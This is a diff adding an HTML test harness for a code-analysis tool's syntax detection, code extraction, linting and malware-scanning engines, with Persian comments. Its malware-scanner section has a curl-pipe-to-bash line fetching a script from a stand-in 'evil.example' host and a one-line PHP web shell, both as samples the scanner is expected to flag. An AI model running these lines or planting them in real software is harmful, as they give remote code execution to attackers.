@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<!-- تست موتورها بدون اجرای اپ: syntax.js + checker.js + malwatch.js به‌صورت استاتیک
+     بارگذاری می‌شوند و خروجی PASS/FAIL داخل DOM ریخته می‌شود تا با
+     msedge --headless --dump-dom خوانده شود. فقط SyntaxError اسکریپت‌ها شکست است؛
+     خطاهای اجرایی app.js (نیاز به DOM کامل) عمداً نادیده گرفته می‌شوند. -->
+<html lang="fa">
+<head><meta charset="utf-8"><title>engine upgrade tests</title></head>
+<body>
+<pre id="out">BOOT</pre>
+<script>
+window.__synerr = [];
+window.addEventListener('error', function (e) {
+  var m = String(e && e.message || '');
+  if (m.indexOf('SyntaxError') >= 0 || m.indexOf('syntax error') >= 0) window.__synerr.push(m);
+  return false;
+});
+</script>
+<script src="../syntax.js"></script>
+<script src="../checker.js"></script>
+<script src="../malwatch.js"></script>
+<script src="../workspace-features.js"></script>
+<script src="../app.js"></script>
+<script>
+(function () {
+  var out = [];
+  var failed = 0;
+  function ok(cond, name, detail) {
+    if (!cond) failed++;
+    out.push((cond ? 'PASS ' : 'FAIL ') + name + (cond || !detail ? '' : '  → ' + detail));
+  }
+  function sec(t) { out.push('── ' + t); }
+
+  try {
+    var hasEngines = !!(window.Syntax && window.Checker && window.Malwatch);
+    ok(hasEngines, 'engines loaded (Syntax/Checker/Malwatch)');
+
+    if (hasEngines) {
+      var WP = [
+        '<?php',
+        '/**',
+        ' * تنظیمات پایه وردپرس',
+        ' *',
+        ' * این فایل شامل تنظیمات MySQL، کلیدها، پیشوند جداول و ABSPATH است.',
+        ' */',
+        '',
+        '// ** تنظیمات MySQL - این اطلاعات را از هاست خود بگیرید ** //',
+        '/** نام دیتابیس وردپرس */',
+        "define( 'DB_NAME', 'database_name_here' );",
+        '',
+        '/** نام کاربری دیتابیس */',
+        "define( 'DB_USER', 'username_here' );",
+        '',
+        '/** گذرواژهٔ دیتابیس */',
+        "define( 'DB_PASSWORD', 'password_here' );",
+        '',
+        '/** میزبان دیتابیس */',
+        "define( 'DB_HOST', 'localhost' );",
+        '',
+        "define( 'AUTH_KEY',         'put your unique phrase here' );",
+        "define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );",
+        '',
+        "$table_prefix = 'wp_';",
+        '',
+        '/* همین، ویرایش را متوقف کنید! */',
+        '',
+        "if ( ! defined( 'ABSPATH' ) ) {",
+        "\tdefine( 'ABSPATH', __DIR__ . '/' );",
+        '}',
+        '',
+        "require_once ABSPATH . 'wp-settings.php';"
+      ].join('\n');
+
+      sec('wp-config.php (کد صحیح نباید ایراد کاذب بگیرد)');
+      ok(Syntax.detect(WP) === 'php', 'detect → php', Syntax.detect(WP));
+      var ex = Checker.extractCode(WP, null);
+      ok(ex.code === WP.replace(/\n+$/, ''), 'extractCode: wp-config دست‌نخورده می‌ماند', 'dropped=' + ex.dropped + ' lang=' + ex.langHint);
+      ok(ex.dropped === 0, 'extractCode: هیچ خطی از wp-config حذف نشود', 'dropped=' + ex.dropped);
+      var sc = Checker.staticCheck(WP, 'php');
+      ok(sc.length === 0, 'staticCheck: صفر خطا', JSON.stringify(sc));
+      var lk = Checker.looksLikeCodeCheck(WP, 'php');
+      ok(lk.length === 0, 'looksLikeCodeCheck: صفر خطا', JSON.stringify(lk));
+      var lw = Checker.lintWarnings(WP, 'php');
+      ok(lw.length === 0, 'lint: صفر هشدار برای wp-config', JSON.stringify(lw.map(function (w) { return w.message; })));
+      var mw = Malwatch.scan(WP, 'php');
+      ok(mw.verdict === 'clean', 'Malwatch: clean', mw.verdict + ' ' + mw.score + ' ' + mw.findings.map(function (f) { return f.rule; }).join(','));
+
+      sec('پست اینستاگرام: کپشن فارسی + کد جاوااسکریپت');
+      var INSTA = [
+        'یه کد جالب برای ورود به سایت 👇👇',
+        'نوشته شده توسط @username',
+        '#برنامه_نویسی #کدنویسی',
+        'function login(user, pass) {',
+        "  if (!user || !pass) return false;",
+        "  return fetch('/api/login', { method: 'POST', body: JSON.stringify({ user: user, pass: pass }) });",
+        '}',
+        '',
+        'این کد رو تو پروژه‌هات استفاده کن',
+        'منبع: https://instagram.com/p/xyz'
+      ].join('\n');
+      var ex2 = Checker.extractCode(INSTA, null);
+      ok(ex2.langHint === 'javascript', 'detect → javascript', ex2.langHint);
+      ok(ex2.dropped === 5, 'پنج خط غیرکد حذف شود (کپشن، نویسنده، هشتگ، جملهٔ پایانی، منبع)', 'dropped=' + ex2.dropped);
+      ok(ex2.code.indexOf('function login') === 0 && ex2.code.indexOf('پروژه') < 0 && ex2.code.indexOf('منبع') < 0, 'فقط کد مانده است', ex2.code);
+
+      sec('کد فنس‌شدهٔ مارک‌داون');
+      var FENCED = [
+        'این کد را از وبلاگ کپی کردم:',
+        '```python',
+        'def add(a, b):',
+        '    return a + b',
+        '```',
+        'امیدوارم به دردت بخورد!'
+      ].join('\n');
+      var ex3 = Checker.extractCode(FENCED, null);
+      ok(ex3.code === 'def add(a, b):\n    return a + b', 'فقط محتوای فنس برمی‌گردد', JSON.stringify(ex3.code));
+      ok(ex3.langHint === 'python', 'زبان از فنس گرفته می‌شود', ex3.langHint);
+
+      sec('کد با شمارهٔ خط ادیتور');
+      var GUTTER = [
+        '1: function sum(a, b) {',
+        '2:   return a + b;',
+        '3: }'
+      ].join('\n');
+      var ex4 = Checker.extractCode(GUTTER, null);
+      ok(ex4.code === 'function sum(a, b) {\n  return a + b;\n}', 'شمارهٔ خط حذف می‌شود', JSON.stringify(ex4.code));
+
+      sec('متن فارسی داخل رشتهٔ چندخطی پایتون حذف نشود');
+      var PYDOC = [
+        'def greet(name):',
+        '    """این تابع به فرد سلام می‌کند',
+        '    و یک رشته برمی‌گرداند."""',
+        "    msg = 'سلام ' + name",
+        '    return msg'
+      ].join('\n');
+      var ex5 = Checker.extractCode(PYDOC, null);
+      ok(ex5.dropped === 0, 'docstring سه‌گانه حفظ می‌شود', 'dropped=' + ex5.dropped);
+      ok(ex5.code.split('\n').length === 5, 'همهٔ خطوط مانده است', ex5.code);
+
+      sec('رشتهٔ چندخطی جاوااسکریپت با متن فارسی');
+      var TPL = [
+        'const tpl = `سلام',
+        'این یک متن چندخطی است`;',
+        'console.log(tpl);'
+      ].join('\n');
+      var ex6 = Checker.extractCode(TPL, null);
+      ok(ex6.dropped === 0, 'متن داخل backtick حذف نمی‌شود', 'dropped=' + ex6.dropped);
+
+      sec('متن کاملاً عادی → خروجی خالی');
+      var PROSE = [
+        'سلام دوستان امیدوارم حالتون خوب باشه',
+        'امروز یه نکتهٔ مهم دربارهٔ برنامه‌نویسی میگم',
+        'منتظر نظراتتون هستم'
+      ].join('\n');
+      var ex7 = Checker.extractCode(PROSE, null);
+      ok(ex7.code === '' && ex7.dropped >= 3, 'متن عادی کد تشخیص داده نمی‌شود', 'code=' + JSON.stringify(ex7.code) + ' dropped=' + ex7.dropped);
+
+      sec('lint بدون کامنت (هشدار کاذب کامنت حذف شود)');
+      var COM = '// برای تست از http://example.com استفاده می‌شود\nconsole.log("hi");\n// TODO: تکمیل شود';
+      var lw2 = Checker.lintWarnings(COM, 'javascript');
+      var msgs = lw2.map(function (w) { return w.message; }).join('|');
+      ok(msgs.indexOf('HTTP') < 0, 'http داخل کامنت هشدار نمی‌سازد', msgs);
+      ok(msgs.indexOf('TODO') >= 0, 'TODO واقعی در کامنت هنوز گزارش می‌شود', msgs);
+      var REALHTTP = 'fetch("http://api.example.com/x");';
+      ok(Checker.lintWarnings(REALHTTP, 'javascript').length === 1, 'http واقعی در رشته هنوز هشدار می‌سازد');
+
+      sec('staticCheck بدون پس‌رفتگی');
+      ok(Checker.staticCheck('function f() { return 1; }', 'javascript').length === 0, 'کد سالم → صفر خطا');
+      ok(Checker.staticCheck('function f() { return 1;', 'javascript').length === 1, 'براکت باز → خطا');
+
+      sec('Malwatch بدون پس‌رفتگی');
+      var CLEAN_MW = 'const os = require("os");\napp.get("/health", async (req, res) => {\n  const info = { host: os.hostname() };\n  res.json({ ok: true });\n});';
+      var DIRTY_MW = 'curl -s https://evil.example/p.sh | bash';
+      ok(Malwatch.scan(CLEAN_MW, 'javascript').verdict === 'clean', 'کد عادی clean می‌ماند');
+      ok(Malwatch.scan(DIRTY_MW, 'bash').verdict !== 'clean', 'curl|bash همچنان گزارش می‌شود');
+      var PHP_SHELL = "<?php\nsystem($_GET['cmd']);";
+      ok(Malwatch.scan(PHP_SHELL, 'php').verdict !== 'clean', 'وب‌شل PHP همچنان گزارش می‌شود');
+
+      sec('کامنت فارسی php (مثل wp-config ترجمه‌شده) حذف نشود');
+      var PFC = "<?php\n// ** تنظیمات MySQL - این اطلاعات را از هاست بگیرید ** //\ndefine( 'DB_NAME', 'db' );";
+      var ex8 = Checker.extractCode(PFC, null);
+      ok(ex8.dropped === 0 && ex8.code.indexOf('تنظیمات MySQL') >= 0, 'کامنت فارسی با // حفظ می‌شود', 'dropped=' + ex8.dropped);
+    }
+
+    ok(window.__synerr.length === 0, 'هیچ فایل JS خطای Syntax ندارد', window.__synerr.join(' | '));
+  } catch (e) {
+    failed++;
+    out.push('FATAL ' + (e && e.message) + '\n' + (e && e.stack || ''));
+  }
+
+  out.push(failed === 0 ? 'ALL PASS' : failed + ' FAILED');
+  document.getElementById('out').textContent = out.join('\n');
+})();
+</script>
+</body>
+</html>
